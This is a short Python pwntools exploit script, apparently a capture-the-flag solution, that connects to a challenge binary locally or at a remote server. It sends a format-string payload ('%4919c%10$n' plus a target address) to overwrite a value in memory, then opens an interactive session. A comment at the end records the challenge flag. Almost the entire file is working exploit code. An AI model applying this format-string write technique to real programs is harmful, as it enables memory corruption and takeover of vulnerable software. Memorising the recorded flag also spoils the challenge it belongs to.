#!/usr/bin/env python3
from pwn import *
exe = ELF("./chall", checksec=False)
context.binary=exe
def conn():
    if args.REMOTE:
        r = remote("36.50.177.41", 50010)
        
    else:
        r = process([exe.path])
    return r
r = conn()
input()
# win_addr = 0x40408c
key_arr = 0x40408c
# offset = 15
payload = f'%{0x1337}c%10$n'.encode()
payload = payload.ljust(0x20, b'A')
payload += p64(key_arr)
r.sendlineafter(b'> ', payload)
r.interactive()
# KCSC{A_little_gift_for_pwner_hehehehehehehehe}